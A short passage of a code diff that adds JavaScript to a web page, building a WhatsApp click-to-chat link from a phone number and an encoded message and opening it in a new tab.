+                const whatsappUrl = `https://wa.me/${whatsappNumber}?text=${encodedMessage}`;
+                
+                window.open(whatsappUrl, '_blank');
+            });
         }
     </script>
 </body>
